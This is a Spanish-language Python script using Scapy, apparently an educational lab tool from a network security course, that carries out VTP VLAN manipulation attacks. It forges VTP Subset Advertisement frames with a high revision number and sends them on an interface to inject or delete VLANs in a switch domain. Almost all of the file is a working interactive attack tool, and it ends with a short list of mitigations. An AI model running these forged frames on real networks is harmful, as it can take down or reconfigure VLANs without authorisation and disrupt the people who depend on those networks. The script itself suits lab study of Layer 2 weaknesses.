#!/usr/bin/env python3
"""
VTP VLAN MANIPULATION ATTACKS - Interactive Script (Configurable)
Autor: Edwin (2024-2415)
Institución: ITLA - Seguridad Informática
Seguridad de Redes

Script interactivo que permite AGREGAR o BORRAR una VLAN.
Los parámetros se configuran DESPUÉS de elegir el tipo de ataque.
"""

from scapy.all import *
import struct
import hashlib
import sys
import datetime

# ═══════════════════════════════════════════════════════════════════════════
# FUNCIONES
# ═══════════════════════════════════════════════════════════════════════════

def print_banner():
    """Muestra banner del programa"""
    print("\n")
    print("╔════════════════════════════════════════════════════════════════════╗")
    print("║                  VTP VLAN MANIPULATION ATTACKS                     ║")
    print("║                                                                    ║")
    print("║  Autor: Edwin (2024-2415)                                         ║")
    print("║  Institución: ITLA - Seguridad Informática                        ║")
    print("║  Demostración educativa de vulnerabilidades L2                    ║")
    print("╚════════════════════════════════════════════════════════════════════╝")
    print()

def print_menu():
    """Muestra menú de opciones de ataque"""
    print("┌─ SELECCIONA UN ATAQUE ──────────────────────────────────────────┐")
    print("│                                                                 │")
    print("│  [1] AGREGAR VLAN                                              │")
    print("│      └─ Inyecta una VLAN nueva en el dominio VTP               │")
    print("│                                                                 │")
    print("│  [2] BORRAR VLAN                                               │")
    print("│      └─ Elimina una VLAN existente del dominio VTP             │")
    print("│                                                                 │")
    print("│  [0] Salir                                                      │")
    print("│                                                                 │")
    print("└─────────────────────────────────────────────────────────────────┘")
    print()

def get_parameters(attack_type):
    """Obtiene parámetros según el tipo de ataque elegido"""
    print("┌─ CONFIGURACIÓN DEL ATAQUE ──────────────────────────────────────┐")
    print("│                                                                 │")
    
    # Domain VTP
    domain = input("│ Dominio VTP [ITLA-NET]: ").strip()
    if not domain:
        domain = "ITLA-NET"
    if len(domain) > 32:
        domain = domain[:32]
    
    # Interfaz
    iface = input("│ Interfaz de red [ens33]: ").strip()
    if not iface:
        iface = "ens33"
    
    # Revisión
    while True:
        try:
            revision_str = input("│ Revisión VTP [2147483647]: ").strip()
            if not revision_str:
                revision = 2147483647
            else:
                revision = int(revision_str)
                if revision < 0 or revision > 4294967295:
                    print("│ ✗ Revisión debe estar entre 0 y 4294967295                  │")
                    continue
            break
        except ValueError:
            print("│ ✗ Ingresa un número válido                                    │")
    
    # Parámetros específicos según el ataque
    if attack_type == '1':
        print("│                                                                 │")
        print("│ ─── VLAN A AGREGAR ───────────────────────────────────────── │")
        
        while True:
            try:
                vlan_id_str = input("│ VLAN ID a agregar [50]: ").strip()
                if not vlan_id_str:
                    vlan_id = 50
                else:
                    vlan_id = int(vlan_id_str)
                    if vlan_id < 1 or vlan_id > 4094:
                        print("│ ✗ VLAN ID debe estar entre 1 y 4094                        │")
                        continue
                break
            except ValueError:
                print("│ ✗ Ingresa un número válido                                    │")
        
        vlan_name = input("│ Nombre de VLAN [VLAN_ESTUDIANTES_2024]: ").strip()
        if not vlan_name:
            vlan_name = "VLAN_ESTUDIANTES_2024"
        if len(vlan_name) > 32:
            vlan_name = vlan_name[:32]
        
        status = 1  # active
        
    else:  # attack_type == '2'
        print("│                                                                 │")
        print("│ ─── VLAN A BORRAR ────────────────────────────────────────── │")
        
        while True:
            try:
                vlan_id_str = input("│ VLAN ID a borrar [15]: ").strip()
                if not vlan_id_str:
                    vlan_id = 15
                else:
                    vlan_id = int(vlan_id_str)
                    if vlan_id < 1 or vlan_id > 4094:
                        print("│ ✗ VLAN ID debe estar entre 1 y 4094                        │")
                        continue
                break
            except ValueError:
                print("│ ✗ Ingresa un número válido                                    │")
        
        vlan_name = input("│ Nombre de VLAN [VLAN_USERS]: ").strip()
        if not vlan_name:
            vlan_name = "VLAN_USERS"
        if len(vlan_name) > 32:
            vlan_name = vlan_name[:32]
        
        status = 3  # suspended
    
    print("│                                                                 │")
    print("└─────────────────────────────────────────────────────────────────┘")
    print()
    
    return {
        'domain': domain,
        'iface': iface,
        'revision': revision,
        'vlan_id': vlan_id,
        'vlan_name': vlan_name,
        'status': status
    }

def show_attack_info(attack_type, params):
    """Muestra información del ataque con parámetros configurados"""
    if attack_type == '1':
        attack_name = "AGREGAR VLAN"
    else:
        attack_name = "BORRAR VLAN"
    
    print("┌─ INFORMACIÓN DEL ATAQUE ────────────────────────────────────────┐")
    print(f"│ Tipo:              {attack_name:<37} │")
    print(f"│ Domain VTP:        {params['domain']:<37} │")
    print(f"│ Interfaz:          {params['iface']:<37} │")
    print(f"│ Revisión:          {params['revision']:<37} │")
    print(f"│ VLAN ID:           {params['vlan_id']:<37} │")
    print(f"│ VLAN Name:         {params['vlan_name']:<37} │")
    
    if params['status'] == 1:
        estado = "ACTIVE (agregar)"
    else:
        estado = "SUSPENDED (borrar)"
    
    print(f"│ Estado:            {estado:<37} │")
    print("└─────────────────────────────────────────────────────────────────┘")
    print()

def build_vlan_tlv(vlan_id, vlan_name, status):
    """Construye un TLV (Type-Length-Value) de VLAN"""
    name_bytes = vlan_name.encode()
    name_len = len(name_bytes)
    name_padded = name_bytes.ljust(32, b'\x00')
    
    tlv_value = struct.pack('!B', name_len)
    tlv_value += struct.pack('!H', vlan_id)
    tlv_value += struct.pack('!H', 1500)  # MTU
    tlv_value += struct.pack('!I', 0)
    tlv_value += name_padded
    tlv_value += struct.pack('!B', status)  # 1=active, 3=suspended
    tlv_value += struct.pack('!B', 1)       # Type=Ethernet
    tlv_value += struct.pack('!H', 0)       # Rings
    tlv_value += struct.pack('!B', 0)       # Bridge Type
    tlv_value += struct.pack('!B', 0)       # AREHops
    tlv_value += struct.pack('!B', 0)       # STEHops
    tlv_value += struct.pack('!B', 0)       # Backup CRF
    
    tlv_length = len(tlv_value)
    tlv = struct.pack('!BB', 0x01, tlv_length) + tlv_value
    return tlv

def build_vtp_packet(domain, revision, vlan_id, vlan_name, vlan_status, src_mac):
    """Construye paquete VTP Subset Advertisement con MD5 calculado"""
    domain_bytes = domain.encode()
    domain_len = len(domain_bytes)
    domain_padded = domain_bytes.ljust(32, b'\x00')
    
    # Crear TLV de VLAN
    vlan_tlv = build_vlan_tlv(vlan_id, vlan_name, vlan_status)
    
    # Header VTP (temporal, sin MD5)
    vtp_header = struct.pack('!BBBB', 0x01, 0x02, 0x00, domain_len)
    vtp_header += domain_padded
    vtp_header += struct.pack('!I', revision)
    vtp_header += struct.pack('!I', 0)  # Updater ID
    vtp_header += b"20240612074000"     # Timestamp
    vtp_header += b'\x00' * 16          # MD5 temporal
    
    # Payload para calcular MD5
    vtp_payload_for_md5 = vtp_header + vlan_tlv
    
    # CALCULAR MD5
    calculated_md5 = hashlib.md5(vtp_payload_for_md5).digest()
    
    print(f"[*] MD5 Calculado: {calculated_md5.hex().upper()}")
    
    # Header final con MD5 real
    vtp_header_final = struct.pack('!BBBB', 0x01, 0x02, 0x00, domain_len)
    vtp_header_final += domain_padded
    vtp_header_final += struct.pack('!I', revision)
    vtp_header_final += struct.pack('!I', 0)
    vtp_header_final += b"20240612074000"
    vtp_header_final += calculated_md5
    
    vtp_payload = vtp_header_final + vlan_tlv
    
    # Encapsulation LLC/SNAP
    llc_snap = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP(OUI=0x00000c, code=0x2003)
    
    # Frame final
    frame = Ether(dst="01:00:0c:cc:cc:cc", src=src_mac) / llc_snap / Raw(load=vtp_payload)
    
    return frame, calculated_md5

def confirm_attack():
    """Pide confirmación antes de ejecutar"""
    print("⚠️  ADVERTENCIA: Este script inyectará paquetes VTP falsos.")
    print("⚠️  Solo usa en laboratorios autorizados.")
    print()
    while True:
        response = input("¿Estás seguro de continuar? (s/n): ").lower().strip()
        if response in ['s', 'si']:
            return True
        elif response in ['n', 'no']:
            return False
        else:
            print("Opción inválida. Escribe 's' o 'n'")

def execute_attack(attack_type, params):
    """Ejecuta el ataque"""
    if attack_type == '1':
        attack_name = "AGREGAR VLAN"
    else:
        attack_name = "BORRAR VLAN"
    
    print("\n" + "="*70)
    print(f"EJECUTANDO: {attack_name}")
    print("="*70)
    print()
    
    # Obtener MAC address de la interfaz
    try:
        src_mac = get_if_hwaddr(params['iface'])
    except:
        print(f"[✗] Error: No se pudo obtener MAC de interfaz {params['iface']}")
        return
    
    # Construir paquete
    print("[*] Construyendo paquete VTP Subset Advertisement...")
    try:
        pkt, md5 = build_vtp_packet(
            params['domain'],
            params['revision'],
            params['vlan_id'],
            params['vlan_name'],
            params['status'],
            src_mac
        )
    except Exception as e:
        print(f"[✗] Error al construir paquete: {e}")
        return
    
    print()
    
    # Mostrar estructura
    print("[*] Estructura del paquete:")
    print("─" * 70)
    pkt.show()
    print("─" * 70)
    print()
    
    # Enviar
    print("[*] Enviando 5 Subset Advertisements...")
    print()
    
    try:
        for i in range(5):
            sendp(pkt, iface=params['iface'], verbose=False)
            print(f"    [{i+1}/5] Paquete enviado a las {datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]}")
        
        print()
        print("[✓] ===== ENVÍO COMPLETADO =====")
        print()
        print("PRÓXIMOS PASOS:")
        print("  1. En el switch, ejecuta: show vlan brief")
        print("  2. Verifica en el debug: debug sw-vlan vtp events")
        print()
        
        if params['status'] == 1:
            print(f"  ✓ Si el ataque funciona, debería aparecer VLAN {params['vlan_id']} ({params['vlan_name']})")
        else:
            print(f"  ✓ Si el ataque funciona, VLAN {params['vlan_id']} debería estar DELETED")
        
        print()
        
    except Exception as e:
        print(f"[✗] Error al enviar: {e}")
        print()

def show_mitigation():
    """Muestra mitigaciones contra los ataques"""
    print("\n" + "="*70)
    print("MITIGACIONES CONTRA ATAQUES VTP")
    print("="*70)
    print()
    
    mitigations = [
        ("VTP Password", "Configura una contraseña VTP para validar paquetes"),
        ("VTP Version 3", "Usa autenticación mejorada (más seguro que v1/v2)"),
        ("VTP Transparent", "Modo transparent = no sincroniza automáticamente"),
        ("DTP Disable", "Desactiva negotiation: 'switchport nonegotiate'"),
        ("Port Security", "Limita quién puede conectarse al puerto trunk"),
    ]
    
    for i, (nombre, descripcion) in enumerate(mitigations, 1):
        print(f"  {i}. {nombre}")
        print(f"     └─ {descripcion}")
        print()

def main():
    """Programa principal"""
    while True:
        print_banner()
        print_menu()
        
        choice = input("Opción: ").strip()
        
        if choice == '0':
            print("Saliendo...")
            print()
            sys.exit(0)
        
        if choice not in ['1', '2']:
            print("[✗] Opción inválida. Intenta de nuevo.")
            print()
            input("Presiona ENTER para continuar...")
            print("\033c", end="")
            continue
        
        # Obtener parámetros según el ataque elegido
        params = get_parameters(choice)
        
        # Mostrar información
        show_attack_info(choice, params)
        
        # Pedir confirmación
        if not confirm_attack():
            print("Ataque cancelado.")
            print()
            input("Presiona ENTER para continuar...")
            print("\033c", end="")
            continue
        
        # Ejecutar ataque
        execute_attack(choice, params)
        
        # Mostrar mitigaciones
        show_mitigation()
        
        input("Presiona ENTER para volver al menú...")
        print("\033c", end="")

# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrumpido por usuario.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[✗] Error fatal: {e}")
        sys.exit(1)
